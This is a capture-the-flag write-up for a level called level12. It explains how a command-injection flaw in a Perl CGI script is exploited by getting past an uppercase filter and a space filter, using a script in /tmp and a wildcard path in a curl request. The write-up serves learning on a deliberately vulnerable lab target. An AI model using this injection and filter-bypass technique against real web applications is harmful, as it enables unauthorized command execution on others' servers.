## level12

Once again, there is a Perl CGI script running on port 4646.

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    foreach $line (@output) {
        ($f, $s) = split(/:/, $line);
        if($s =~ $nn) {
            return 1;
        }
    }
    return 0;
}

sub n {
    if($_[0] == 1) {
        print("..");
    } else {
        print(".");
    }    
}

n(t(param("x"), param("y")));
```

It will display one or two dots depending on the values of x and y. The vulnerability is quite clear, there is a command run with backticks: `` `egrep "^$xx" /tmp/xd 2>&1` ``. We can focus on the important parts.

```perl
#!/usr/bin/env perl
use CGI qw{param};
$x = param("x");
$x =~ tr/a-z/A-Z/; 
$x =~ s/\s.*//;
@output = `egrep "^$x" /tmp/xd 2>&1`;
```

The difficulty lies in the fact that our `x` parameter will be put in uppercase and everything after the first space will be removed. Naively injecting `` `getflag | wall` `` won't work.

`bash` variables can be written in octal notation, which doesn't use any lowercase letter or space. We could execute `getflag | wall` like that: `G=$'\147\145\164\146\154\141\147';W=$'\167\141\154\154';$G|$W`. Thinking that the semicolons were the problem, we put `getflag | wall` in `/tmp/REKT` and tried to encode `tmp`. Still didn't work. It turns out Perl executes `sh`, which doesn't allow the octal notation.

We still had our `/tmp/REKT` file and had to find a way to execute it without writing `tmp` explicitly. This is when wildcards came to mind.

```bash
$ echo 'getflag | wall' > /tmp/REKT
$ chmod +x /tmp/REKT
$ curl 'http://localhost:4646?x=`/*/REKT`'
```